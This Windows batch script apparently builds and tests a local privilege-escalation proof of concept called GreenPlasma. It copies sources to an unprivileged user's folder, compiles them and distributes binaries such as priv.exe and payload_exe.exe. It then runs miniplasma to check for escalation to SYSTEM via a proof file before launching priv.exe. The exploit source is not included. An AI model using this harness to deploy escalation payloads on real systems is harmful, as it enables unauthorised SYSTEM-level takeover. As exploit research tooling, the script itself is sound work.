@echo off
setlocal

set SRC=Z:\public share\phantomrpc-poc-main\phantomrpc-poc-main\POCs\GreenPlasma
set DST=C:\Users\unpriv\Music
set OUT=Z:\public share\EasyPlasma

:: Kill any running instances FIRST so robocopy can overwrite the EXEs
taskkill /F /IM GreenPlasma.exe /T >nul 2>&1
taskkill /F /IM ctf_alpc.exe    /T >nul 2>&1
timeout /T 2 /NOBREAK >nul

:: Verify source is reachable
if not exist "%SRC%\GreenPlasma.cpp" (
    echo [-] Source not found: %SRC%
    exit /b 1
)

:: Robocopy source files only
robocopy "%SRC%" "%DST%" *.cpp *.c *.cs *.bat /Z /COPY:DAT /W:2 /R:5 /NFL /NDL /NJH /NJS
if errorlevel 8 (
    echo [-] Sync failed
    exit /b 1
)

:: Build
cd /d "%DST%"
call build.bat 2>&1 | findstr /V "C4005" | findstr /V "previously declared"
if errorlevel 1 exit /b 1

:: Copy built outputs back to both shared folders
echo.
echo [*] Copying outputs back...
if not exist "%OUT%" mkdir "%OUT%"
for %%f in (priv.exe syshost.exe priv.bat miniplasma.exe payload_exe.exe GreenPlasma.exe ctf_alpc.exe) do (
    if exist "%DST%\%%f" (
        copy /Y "%DST%\%%f" "%SRC%\%%f" >nul 2>&1 || echo [!] SRC copy skipped for %%f
        copy /Y "%DST%\%%f" "%OUT%\%%f" >nul 2>&1
        echo [+] %%f
    )
)

:: Test priv.exe with miniplasma first (writes SYSTEM_PROOF.txt)
echo.
echo [*] Testing escalation via miniplasma...
del /F /Q "C:\Temp\SYSTEM_PROOF.txt" >nul 2>&1
mkdir C:\Temp >nul 2>&1
copy /Y payload_exe.exe C:\Temp\payload_exe.exe >nul
miniplasma.exe C:\Temp\payload_exe.exe
echo.
if exist "C:\Temp\SYSTEM_PROOF.txt" (
    echo [+] TEST PASSED - escalation works:
    type "C:\Temp\SYSTEM_PROOF.txt"
    echo.
    echo [*] Launching priv.exe...
    priv.exe
) else (
    echo [-] TEST FAILED - SYSTEM_PROOF.txt not found
    echo [-] Check miniplasma output above. Not launching priv.exe.
    echo.
    echo [*] Debug log ^(if any^):
    if exist "C:\ProgramData\priv_debug.log" type "C:\ProgramData\priv_debug.log"
)
